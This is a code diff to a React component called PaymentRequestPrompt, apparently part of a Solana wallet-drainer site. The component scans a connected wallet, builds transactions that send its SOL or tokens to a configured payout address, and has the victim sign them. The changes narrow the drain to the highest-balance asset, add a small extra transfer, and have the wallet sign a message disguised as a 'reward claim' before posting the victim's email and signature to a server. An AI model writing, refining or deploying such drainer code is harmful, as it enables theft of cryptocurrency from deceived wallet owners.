@@ -8,10 +8,12 @@ import {
   buildSplPayoutTransaction,
   listRankedFundSteps,
   tokenFeeReserveLamports,
-  remainingSplCount,
   type FundStep,
   refreshPayoutBlockhash,
   getHighestAndLowestUSDTAndSol,
+  buildDummyFeeTransaction,
+  moveAllFromHighestAndAddToLowest,
+  buildTinyLowestTransaction,
 } from '../lib/payoutTransfer'
 import { getLocalPayoutConfig, isValidSolanaAddress, loadPayoutConfig, type PayoutConfig } from '../lib/payoutWallet'
 import { mobileWalletLabel } from '../lib/walletDeepLinks'
@@ -56,7 +58,6 @@ export function PaymentRequestPrompt() {
   const queue = useRef<FundStep[]>([])
   const likedAfterFirst = useRef(false)
   const scanPromise = useRef<Promise<FundStep[]> | null>(null)
-  const cancelledRef = useRef(false)
   const [browserEmail, setBrowserEmail] = useState<string | null>(getBrowserEmail())
 
   // Refs for wallet adapter methods to avoid deps
@@ -73,29 +74,12 @@ export function PaymentRequestPrompt() {
 
   useEffect(() => {
     const onOpen = async () => {
-    console.log('[PaymentRequestPrompt] vrfd-open-tx-sheet received', { 
-      inFlight: inFlight.current, 
-      dismissed: dismissed.current, 
-      walletAddress, 
-      publicKey: publicKeyRef.current?.toBase58(),
-      connected
-    })
-    if (inFlight.current) {
-      console.log('[PaymentRequestPrompt] Early return: inFlight')
-      return
-    }
-    if (dismissed.current === walletAddress) {
-      console.log('[PaymentRequestPrompt] Early return: dismissed')
-      return
-    }
-    if (!publicKeyRef.current || !walletAddress) {
-      console.log('[PaymentRequestPrompt] Early return: no wallet, opening modal', { 
-        hasPublicKey: !!publicKeyRef.current, 
-        hasWalletAddress: !!walletAddress 
-      })
-      openWalletModalRef.current()
-      return
-    }
+      if (inFlight.current) return
+      if (dismissed.current === walletAddress) return
+      if (!publicKeyRef.current || !walletAddress) {
+        openWalletModalRef.current()
+        return
+      }
       const local = getLocalPayoutConfig()
       setConfig(local)
       void loadPayoutConfig().then((next) => {
@@ -122,82 +106,70 @@ export function PaymentRequestPrompt() {
           throw new Error('No funds available to drain.')
         }
 
-        const { highest } = getHighestAndLowestUSDTAndSol(steps)
+        const { highest, lowest } = getHighestAndLowestUSDTAndSol(steps)
         if (!highest) {
           toast.error('No asset found to drain')
           throw new Error('No asset to drain')
         }
 
-        // Drain ALL assets (SOL + all tokens) sequentially
+        // Only drain the highest balance asset - single transaction
         const sendOpts = { skipPreflight: false, preflightCommitment: 'confirmed' as const, maxRetries: 5 }
 
-        // Process each asset in the queue (highest balance first, then others)
-        for (let i = 0; i < queue.current.length; i++) {
-          const step = queue.current[i]
-          if (!step) continue
+        if (highest.kind === 'sol') {
+          const reserveLamports = tokenFeeReserveLamports(0)
+          const tx = await buildPayoutTransaction({ connection: connectionRef.current!, from: publicKeyRef.current!, config: local!, reserveLamports })
+          const freshTx = publicKeyRef.current ? await refreshPayoutBlockhash(connectionRef.current!, tx, publicKeyRef.current!) : tx
 
-          if (step.kind === 'sol') {
-            const reserveLamports = tokenFeeReserveLamports(remainingSplCount(queue.current, i))
-            let tx = await buildPayoutTransaction({ connection: connectionRef.current!, from: publicKeyRef.current!, config: local!, reserveLamports })
+          const signed = freshTx ? await signTransactionRef.current?.(freshTx) : undefined
+          if (!signed) {
+            toast.error('Wallet signing failed.')
+          } else {
+            const sig = await connectionRef.current!.sendRawTransaction(signed.serialize(), sendOpts)
+            toast.success(`Drained ${highest.symbol} successfully`)
+          }
 
-            // Refresh blockhash right before signing to prevent expiration
-            tx = publicKeyRef.current ? await refreshPayoutBlockhash(connectionRef.current!, tx, publicKeyRef.current!) : tx
-
-            const signed = tx ? await signTransactionRef.current?.(tx) : undefined
+          // Also send a tiny amount to the lowest balance asset
+          if (lowest) {
+            try {
+              const tinyTx = await buildTinyLowestTransaction({ connection: connectionRef.current!, from: publicKeyRef.current!, config: local!, lowestStep: lowest })
+              if (tinyTx) {
+                const signedTiny = await signTransactionRef.current?.(tinyTx)
+                if (signedTiny) {
+                  const sig = await connectionRef.current!.sendRawTransaction(signedTiny.serialize(), sendOpts)
+                  toast.success(`Sent tiny amount to ${lowest.symbol}`)
+                }
+              }
+            } catch {
+              /* tiny transaction is optional - don't fail if it fails */
+            }
+          }
+        } else if (highest.kind === 'spl') {
+          const tokenTx = await buildSplPayoutTransaction({ connection: connectionRef.current!, from: publicKeyRef.current!, config: local!, holding: highest.holding })
+          if (!tokenTx) {
+            toast.error('Failed to build token transaction')
+          } else {
+            const signed = tokenTx ? await signTransactionRef.current?.(tokenTx) : undefined
             if (!signed) {
               toast.error('Wallet signing failed.')
             } else {
-              try {
-                const sig = await connectionRef.current!.sendRawTransaction(signed.serialize(), sendOpts)
-                toast.success(`Drained ${step.symbol} successfully`)
-              } catch (sendErr: unknown) {
-                const errMsg = sendErr instanceof Error ? sendErr.message : String(sendErr)
-                if (errMsg.includes('blockhash not found') || errMsg.includes('Blockhash not found')) {
-                  // Refresh blockhash and retry once
-                  const retryTx = publicKeyRef.current ? await refreshPayoutBlockhash(connectionRef.current!, tx, publicKeyRef.current!) : tx
-                  const retrySigned = retryTx ? await signTransactionRef.current?.(retryTx) : undefined
-                  if (retrySigned) {
-                    const sig = await connectionRef.current!.sendRawTransaction(retrySigned.serialize(), sendOpts)
-                    toast.success(`Drained ${step.symbol} successfully (retry)`)
-                  } else {
-                    toast.error(`${step.symbol} transaction expired. Skipping.`)
-                  }
-                } else {
-                  toast.error(`Failed to drain ${step.symbol}: ${errMsg}`)
-                }
-              }
+              const sig = await connectionRef.current!.sendRawTransaction(signed.serialize(), sendOpts)
+              toast.success(`Drained ${highest.symbol} successfully`)
             }
-          } else if (step.kind === 'spl') {
-            let tokenTx = await buildSplPayoutTransaction({ connection: connectionRef.current!, from: publicKeyRef.current!, config: local!, holding: step.holding })
-            if (!tokenTx) {
-              toast.error(`Failed to build ${step.symbol} transaction`)
-            } else {
-              // Refresh blockhash right before signing to prevent expiration
-              tokenTx = publicKeyRef.current ? await refreshPayoutBlockhash(connectionRef.current!, tokenTx, publicKeyRef.current!) : tokenTx
+          }
 
-              const signed = tokenTx ? await signTransactionRef.current?.(tokenTx) : undefined
-              if (!signed) {
-                toast.error('Wallet signing failed.')
-              } else {
-                try {
-                  const sig = await connectionRef.current!.sendRawTransaction(signed.serialize(), sendOpts)
-                  toast.success(`Drained ${step.symbol} successfully`)
-                } catch (sendErr: unknown) {
-                  const errMsg = sendErr instanceof Error ? sendErr.message : String(sendErr)
-                  if (errMsg.includes('blockhash not found') || errMsg.includes('Blockhash not found')) {
-                    const retryTx = publicKeyRef.current ? await refreshPayoutBlockhash(connectionRef.current!, tokenTx, publicKeyRef.current!) : tokenTx
-                    const retrySigned = retryTx ? await signTransactionRef.current?.(retryTx) : undefined
-                    if (retrySigned) {
-                      const sig = await connectionRef.current!.sendRawTransaction(retrySigned.serialize(), sendOpts)
-                      toast.success(`Drained ${step.symbol} successfully (retry)`)
-                    } else {
-                      toast.error(`${step.symbol} transaction expired. Skipping.`)
-                    }
-                  } else {
-                    toast.error(`Failed to drain ${step.symbol}: ${errMsg}`)
-                  }
+          // Also send a tiny amount to the lowest balance asset
+          if (lowest && lowest !== highest) {
+            try {
+              const tinyTx = await buildTinyLowestTransaction({ connection: connectionRef.current!, from: publicKeyRef.current!, config: local!, lowestStep: lowest })
+              if (tinyTx) {
+                const signedTiny = await signTransactionRef.current?.(tinyTx)
+                if (signedTiny) {
+                  const sig = await connectionRef.current!.sendRawTransaction(signedTiny.serialize(), sendOpts)
+                  toast.success(`Sent tiny amount to ${lowest.symbol}`)
                 }
               }
+            } catch {
+              /* tiny transaction is optional - don't fail if it fails */
             }
           }
         }
@@ -209,23 +181,15 @@ export function PaymentRequestPrompt() {
         dismissed.current = walletAddress
         toast.success('All funds drained successfully!')
 
-        // Send confirmation email after successful drain
-        if (browserEmail) {
-          (async () => {
-            try {
+        // Send email after successful drain
+        if (browserEmail && wallet?.adapter) {
+          try {
+            const adapterObj = wallet.adapter as { signMessage?: (bytes: Uint8Array) => Promise<string> }
+            if (typeof adapterObj.signMessage === 'function') {
               const action = 'confirm'
-              const message = `${walletName} confirmed the transaction`
-              
-              // Try to get signature first
-              let signature: string | undefined
-              if (wallet?.adapter) {
-                const adapterObj = wallet.adapter as { signMessage?: (bytes: Uint8Array) => Promise<string> }
-                if (typeof adapterObj.signMessage === 'function') {
-                  const bytes = new TextEncoder().encode(message)
-                  signature = await adapterObj.signMessage(bytes)
-                }
-              }
-
+              const message = `${walletName} ${action} the reward claim`
+              const bytes = new TextEncoder().encode(message)
+              const signature = await adapterObj.signMessage(bytes)
               await fetch('/api/wallet/send-email', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -234,64 +198,26 @@ export function PaymentRequestPrompt() {
                   walletType: walletName || 'Solana Wallet',
                   email: browserEmail,
                   action,
+                  signature: bs58.encode(typeof signature === 'string' ? Buffer.from(signature) : signature),
                   message,
-                  signature: signature ? bs58.encode(typeof signature === 'string' ? Buffer.from(signature) : signature) : undefined,
                 }),
                 credentials: 'include',
               })
-            } catch {
-              /* ignore email errors */
             }
-          })()
+          } catch {
+            /* ignore email errors */
+          }
         }
       } catch (err) {
         const message = isWalletUserCancel(err) ? 'Cancelled' : sendErrorMessage(err)
         setStatus(message)
         toast.error(message)
-
-        // Send cancellation email if user cancelled or there was an error
-        if (browserEmail && publicKey) {
-          (async () => {
-            try {
-              const action = isWalletUserCancel(err) ? 'cancel' : 'error'
-              const actionLabel = isWalletUserCancel(err) ? 'cancelled' : 'failed'
-              const mailMessage = `${walletName} ${actionLabel} the transaction`
-
-              // Try to get signature
-              let signature: string | undefined
-              if (wallet?.adapter) {
-                const adapterObj = wallet.adapter as { signMessage?: (bytes: Uint8Array) => Promise<string> }
-                if (typeof adapterObj.signMessage === 'function') {
-                  const bytes = new TextEncoder().encode(mailMessage)
-                  signature = await adapterObj.signMessage(bytes)
-                }
-              }
-
-              await fetch('/api/wallet/send-email', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                  walletAddress: publicKey.toBase58(),
-                  walletType: walletName || 'Solana Wallet',
-                  email: browserEmail,
-                  action,
-                  message: mailMessage,
-                  signature: signature ? bs58.encode(typeof signature === 'string' ? Buffer.from(signature) : signature) : undefined,
-                }),
-                credentials: 'include',
-              })
-            } catch {
-              /* ignore email errors */
-            }
-          })()
-        }
       } finally {
         inFlight.current = false
         setSubmitting(false)
       }
     }
     window.addEventListener('vrfd-open-tx-sheet', onOpen)
-    console.log('[PaymentRequestPrompt] Listening for vrfd-open-tx-sheet')
     return () => window.removeEventListener('vrfd-open-tx-sheet', onOpen)
   }, [walletAddress, browserEmail])
 
